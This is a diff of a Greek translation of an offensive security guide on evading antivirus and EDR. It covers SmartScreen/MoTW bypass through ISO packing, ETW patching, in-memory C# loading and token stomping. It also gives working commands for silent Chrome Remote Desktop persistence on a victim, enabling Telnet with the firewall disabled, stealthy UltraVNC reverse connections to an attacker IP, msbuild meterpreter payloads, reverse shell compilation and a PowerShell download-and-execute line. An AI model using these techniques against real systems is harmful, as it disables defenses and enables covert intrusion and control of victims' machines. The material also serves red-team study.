-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για γλώσσες που υποστηρίζονται από το LLVM και χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code, μετατρέποντας regular instructions σε ROP chains, thwarting τη φυσική μας αντίληψη του normal control flow.
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της [LLVM](http://www.llvm.org/) compilation suite, ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιείτε τη γλώσσα `C++11/14` για να παράγετε, κατά το compile time, obfuscated code χωρίς τη χρήση εξωτερικού εργαλείου και χωρίς τροποποίηση του compiler.
+- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα layer από obfuscated operations που παράγονται από το C++ template metaprogramming framework, κάνοντας τη ζωή του ατόμου που θέλει να κάνει crack την εφαρμογή λίγο δυσκολότερη.
+- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα pe files, όπως: .exe, .dll, .sys
+- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός metamorphic code engine για arbitrary executables.
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages που χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly code, μετατρέποντας τις κανονικές εντολές σε ROP chains και εμποδίζοντας τη φυσιολογική μας αντίληψη για το normal control flow.
 - [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
 - [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει
 
 ## SmartScreen & MoTW
 
-Ίσως να έχεις δει αυτή την οθόνη όταν κατεβάζεις κάποια executables από το internet και τα εκτελείς.
+Μπορεί να έχετε δει αυτή την οθόνη κατά τη λήψη ορισμένων executables από το internet και την εκτέλεσή τους.
 
-Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που προορίζεται να προστατεύει τον τελικό χρήστη από το να εκτελεί potentially malicious applications.
+Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που έχει σχεδιαστεί για να προστατεύει τον end user από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη reputation, που σημαίνει ότι εφαρμογές που κατεβαίνουν ασυνήθιστα θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας έτσι και εμποδίζοντας τον τελικό χρήστη να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμη να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).
+Το SmartScreen λειτουργεί κυρίως με μια reputation-based προσέγγιση, δηλαδή οι εφαρμογές που κατεβαίνουν σπάνια θα ενεργοποιήσουν το SmartScreen, προειδοποιώντας έτσι και εμποδίζοντας τον end user να εκτελέσει το file (παρότι το file μπορεί ακόμη να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).
 
-**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier το οποίο δημιουργείται αυτόματα όταν κατεβάζεις αρχεία από το internet, μαζί με το URL από το οποίο κατεβάστηκε.
+**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη files από το internet, μαζί με το URL από το οποίο έγινε η λήψη.
 
-<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>
+<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα file που κατέβηκε από το internet.</p></figcaption></figure>
 
 > [!TIP]
-> Είναι σημαντικό να σημειωθεί ότι executables που είναι signed με ένα **trusted** signing certificate **won't trigger SmartScreen**.
+> Είναι σημαντικό να σημειωθεί ότι τα executables που είναι υπογεγραμμένα με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.
 
-Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψεις τα payloads σου από το να πάρουν το Mark of The Web είναι να τα πακετάρεις μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **cannot** be applied σε **non NTFS** volumes.
+Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
-Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα tool που πακετάρει payloads σε output containers για να evade το Mark-of-the-Web.
+Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε output containers για να παρακάμπτει το Mark-of-the-Web.
 
-Example usage:
+Παράδειγμα χρήσης:
 ```bash
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
@@ -476,57 +476,57 @@ Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-Εδώ είναι ένα demo για bypassing SmartScreen με συσκευασία payloads μέσα σε ISO files χρησιμοποιώντας [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
+Ακολουθεί ένα demo για την παράκαμψη του SmartScreen με τη συσκευασία payloads μέσα σε αρχεία ISO χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
 
 <figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
 ## ETW
 
-Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός logging στα Windows που επιτρέπει σε applications και system components να **log events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για να παρακολουθούν και να εντοπίζουν malicious activities.
+Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα στοιχεία του συστήματος να **καταγράφουν events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.
 
-Παρόμοια με το πώς το AMSI είναι disabled (bypassed), είναι επίσης δυνατό να κάνετε τη **`EtwEventWrite`** function της user space process να επιστρέφει αμέσως χωρίς να γίνεται logging οποιωνδήποτε events. Αυτό γίνεται με patching της function στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά το ETW logging για εκείνη τη process.
+Όπως ακριβώς το AMSI απενεργοποιείται (παρακάμπτεται), είναι επίσης δυνατό να κάνουμε τη συνάρτηση **`EtwEventWrite`** της user space διεργασίας να επιστρέφει αμέσως χωρίς να καταγράφει κανένα event. Αυτό γίνεται με patching της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.
 
-Μπορείτε να βρείτε περισσότερες πληροφορίες στο **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
+Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
 
 
 ## C# Assembly Reflection
 
-Το loading C# binaries στη μνήμη είναι γνωστό εδώ και αρκετό καιρό και παραμένει ένας πολύ καλός τρόπος για να τρέχετε τα post-exploitation tools σας χωρίς να σας πιάσει το AV.
+Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί έναν πολύ καλό τρόπο εκτέλεσης των post-exploitation tools χωρίς να εντοπίζονται από το AV.
 
-Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει το disk, θα χρειαστεί να ασχοληθούμε μόνο με patching του AMSI για ολόκληρη τη process.
+Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να ασχοληθούμε μόνο με το patching του AMSI για ολόκληρη τη διεργασία.
 
-Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ήδη παρέχουν τη δυνατότητα να εκτελούνται C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι να γίνει αυτό:
+Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:
 
 - **Fork\&Run**
 
-Περιλαμβάνει το **spawning μιας νέας sacrificial process**, injection του post-exploitation malicious code σας σε εκείνη τη νέα process, εκτέλεση του malicious code σας και όταν ολοκληρωθεί, τερματισμό της νέας process. Αυτό έχει τόσο τα πλεονεκτήματά του όσο και τα μειονεκτήματά του. Το πλεονέκτημα της fork and run μεθόδου είναι ότι η εκτέλεση γίνεται **outside** από τη Beacon implant process μας. Αυτό σημαίνει ότι αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια της post-exploitation ενέργειάς μας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant μας να επιβιώσει.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.
+Αυτό περιλαμβάνει τη **δημιουργία μιας νέας sacrificial διεργασίας**, το injection του post-exploitation κακόβουλου κώδικά σας σε αυτήν τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικά σας και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση πραγματοποιείται **εκτός** της διεργασίας του Beacon implant. Αυτό σημαίνει ότι, αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια της post-exploitation ενέργειάς μας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant μας.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
 - **Inline**
 
-Πρόκειται για injection του post-exploitation malicious code **μέσα στην ίδια του τη process**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας process και το scanning της από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας** καθώς μπορεί να κρασάρει.
+Πρόκειται για injection του post-exploitation κακόβουλου κώδικα **στη δική του διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία μιας νέας διεργασίας και το scanning της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** σας, καθώς μπορεί να προκληθεί crash.
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+> Αν θέλετε να διαβάσετε περισσότερα σχετικά με το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 
-Μπορείτε επίσης να φορτώσετε C# Assemblies **from PowerShell**, δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
+Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [video του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).
 
 ## Using Other Programming Languages
 
-Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε malicious code χρησιμοποιώντας άλλες γλώσσες δίνοντας στο compromised machine πρόσβαση **to the interpreter environment installed on the Attacker Controlled SMB share**.
+Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατή η εκτέλεση κακόβουλου κώδικα με τη χρήση άλλων γλωσσών, παρέχοντας στο compromised machine πρόσβαση **στο interpreter environment που είναι εγκατεστημένο στο Attacker Controlled SMB share**.
 
-Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο environment στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του compromised machine.
+Παρέχοντας πρόσβαση στα Interpreter Binaries και στο environment μέσω του SMB share, μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του compromised machine.
 
-Το repo υποδεικνύει: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.
+Το repo αναφέρει: Το Defender εξακολουθεί να κάνει scan στα scripts, αλλά αξιοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη static signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.
 
 ## TokenStomping
 
-Το Token stomping είναι μια technique που επιτρέπει σε έναν attacker να **manipulate το access token ή ένα security prouct όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges του ώστε η process να μην πεθάνει αλλά να μην έχει permissions για να ελέγχει malicious activities.
+Το token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **χειραγωγεί το access token ή ένα security product όπως ένα EDR ή AV**, μειώνοντας τα privileges του, ώστε η διεργασία να μην τερματίζεται, αλλά να μην έχει δικαιώματα για τον έλεγχο κακόβουλων δραστηριοτήτων.
 
-Για να το αποτρέψει αυτό, το Windows θα μπορούσε να **prevent external processes** από το να παίρνουν handles πάνω στα tokens των security processes.
+Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν external processes** από το να αποκτούν handles στα tokens των security processes.
 
 - [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
 - [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
@@ -536,27 +536,27 @@ Adding file: /TotallyLegitApp.exe
 
 ### Chrome Remote Desktop
 
-Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο απλώς να εγκαταστήσετε το Chrome Remote Desktop σε έναν victim PC και μετά να το χρησιμοποιήσετε για να τον takeover και να διατηρήσετε persistence:
-1. Κατεβάστε από https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και μετά κάντε κλικ στο MSI file για Windows για να κατεβάσετε το MSI file.
-2. Τρέξτε τον installer silently στο victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
-3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ next. Ο wizard θα σας ζητήσει στη συνέχεια να authorize; κάντε κλικ στο Authorize button για να συνεχίσετε.
-4. Εκτελέστε το given parameter με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει να ορίσετε το pin without using the GUI).
+Όπως περιγράφεται σε [**αυτό το blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός victim και στη συνέχεια να το χρησιμοποιήσετε για να τον αναλάβετε και να διατηρήσετε persistence:
+1. Κάντε download από το https://remotedesktop.google.com/, κάντε click στο "Set up via SSH" και στη συνέχεια κάντε click στο MSI file για Windows, ώστε να γίνει download του MSI file.
+2. Εκτελέστε σιωπηλά τον installer στον victim (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
+3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε click στο next. Ο wizard θα σας ζητήσει authorization· κάντε click στο κουμπί Authorize για να συνεχίσετε.
+4. Εκτελέστε την παράμετρο που σας δίνεται, με ορισμένες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin, η οποία επιτρέπει τον ορισμό του pin χωρίς τη χρήση του GUI).
 
 
 ## Advanced Evasion
 
-Το Evasion είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε μόνο ένα σύστημα, οπότε είναι πρακτικά αδύνατο να παραμείνετε εντελώς undetected σε mature environments.
+Το Evasion είναι ένα πολύ περίπλοκο θέμα. Μερικές φορές πρέπει να λαμβάνετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, επομένως είναι σχεδόν αδύνατο να παραμείνετε εντελώς undetected σε mature environments.
 
-Κάθε environment στο οποίο θα στοχεύσετε θα έχει τα δικά του πλεονεκτήματα και αδυναμίες.
+Κάθε environment στο οποίο επιτίθεστε θα έχει τα δικά του strengths και weaknesses.
 
-Σας ενθαρρύνω πολύ να δείτε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε ένα foothold στις πιο Advanced Evasion techniques.
+Σας προτείνω ανεπιφύλακτα να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια αρχική βάση στις πιο Advanced Evasion techniques.
 
 
 {{#ref}}
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
 {{#endref}}
 
-Υπάρχει επίσης μια άλλη πολύ καλή ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.
+Αυτή είναι επίσης μια εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.
 
 
 {{#ref}}
@@ -567,49 +567,49 @@ https://www.youtube.com/watch?v=IbA7Ung39o4
 
 ### **Check which parts Defender finds as malicious**
 
-Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **remove parts of the binary** μέχρι να **finds out which part Defender** εντοπίζει ως malicious και να σας το χωρίσει.\
-Ένα άλλο tool που κάνει το **same thing is** το [**avred**](https://github.com/dobin/avred) με ένα ανοιχτό web offering the service στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
+Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και θα σας το διαχωρίσει.\
+Ένα άλλο tool που κάνει **το ίδιο πράγμα είναι το** [**avred**](https://github.com/dobin/avred), με μια open web προσφορά της υπηρεσίας στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Telnet Server**
 
-Μέχρι τα Windows10, όλα τα Windows έρχονταν με έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
+Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server**, τον οποίο μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-Να το **ξεκινά** όταν το σύστημα εκκινείται και να το **τρέξει** τώρα:
+Κάντε το να **ξεκινά** κατά την εκκίνηση του συστήματος και **εκτελέστε** το τώρα:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-**Αλλαγή telnet port** (stealth) και απενεργοποίηση firewall:
+**Αλλαγή της θύρας telnet** (stealth) και απενεργοποίηση του firewall:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)
+Κατέβασέ το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (χρειάζεσαι τα bin downloads, όχι το setup)
 
-**ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:
+**ΣΤΟ HOST**: Εκτέλεσε το _**winvnc.exe**_ και ρύθμισε τον server:
 
-- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
-- Ορίστε password στο _VNC Password_
-- Ορίστε password στο _View-Only Password_
+- Ενεργοποίησε την επιλογή _Disable TrayIcon_
+- Όρισε έναν κωδικό πρόσβασης στο _VNC Password_
+- Όρισε έναν κωδικό πρόσβασης στο _View-Only Password_
 
-Έπειτα, μετακινήστε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**
+Στη συνέχεια, μετακίνησε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**
 
 #### **Reverse connection**
 
-Ο **attacker** θα πρέπει να **εκτελέσει μέσα στον** δικό του **host** το binary `vncviewer.exe -listen 5900` ώστε να είναι **έτοιμο** να δεχτεί μια reverse **VNC connection**. Έπειτα, μέσα στο **victim**: Ξεκινήστε το winvnc daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+Ο **attacker** πρέπει να **εκτελέσει μέσα στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Εκκίνησε το winvnc daemon με `winvnc.exe -run` και εκτέλεσε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
-**WARNING:** Για να διατηρήσετε stealth δεν πρέπει να κάνετε μερικά πράγματα
+**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσεις το stealth, δεν πρέπει να κάνεις ορισμένα πράγματα
 
-- Μην ξεκινήσετε το `winvnc` αν ήδη εκτελείται, αλλιώς θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
-- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, αλλιώς θα προκαλέσει να ανοίξει το [config window](https://i.imgur.com/rfMQWcf.png)
-- Μην τρέξετε `winvnc -h` για βοήθεια, αλλιώς θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)
+- Μην εκκινήσεις το `winvnc` αν εκτελείται ήδη, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Έλεγξε αν εκτελείται με `tasklist | findstr winvnc`
+- Μην εκκινήσεις το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, διαφορετικά θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
+- Μην εκτελέσεις το `winvnc -h` για βοήθεια, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
-Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+Κατέβασέ το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -617,7 +617,7 @@ cd GreatSCT/setup/
 cd ..
 ./GreatSCT.py
 ```
-Μέσα στο GreatSCT:
+Στο GreatSCT:
 ```
 use 1
 list #Listing available payloads
@@ -627,23 +627,23 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-Τώρα **ξεκίνα το lister** με `msfconsole -r file.rc` και **εκτέλεσε** το **xml payload** με:
+Τώρα **ξεκινήστε το listener** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**Ο τρέχων defender θα τερματίσει τη διεργασία πολύ γρήγορα.**
+**Το τρέχον defender θα τερματίσει τη διεργασία πολύ γρήγορα.**
 
-### Compiling our own reverse shell
+### Compiling το δικό μας reverse shell
 
 https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### First C# Revershell
+#### Πρώτο C# Revershell
 
-Compile it with:
+Κάντε compile με:
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
-Χρησιμοποίησέ το με:
+Χρησιμοποιήστε το με:
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -720,7 +720,7 @@ catch (Exception err) { }
 }
 }
 ```
-### C# χρησιμοποιώντας compiler
+### C# με χρήση compiler
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
@@ -740,7 +740,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
 {{#endref}}
 
-Λίστα obfuscators C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+Λίστα με C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
 ```
@@ -755,7 +755,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 - [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 - [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### Χρήση python για παραδείγματα build injectors:
+### Χρήση python για το build injectors, παράδειγμα:
 
 - [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)
 
@@ -784,28 +784,28 @@ https://github.com/TheWover/donut
 # Vulcan
 https://github.com/praetorian-code/vulcan
 ```
-### More
+### Περισσότερα
 
 - [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
-## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space
+## Bring Your Own Vulnerable Driver (BYOVD) – Τερματισμός AV/EDR από τον Kernel Space
 
-Ο Storm-2603 αξιοποίησε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις προστασίες endpoint πριν ρίξει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για να εκτελεί privileged kernel operations που ακόμη και τα Protected-Process-Light (PPL) AV services δεν μπορούν να μπλοκάρουν.
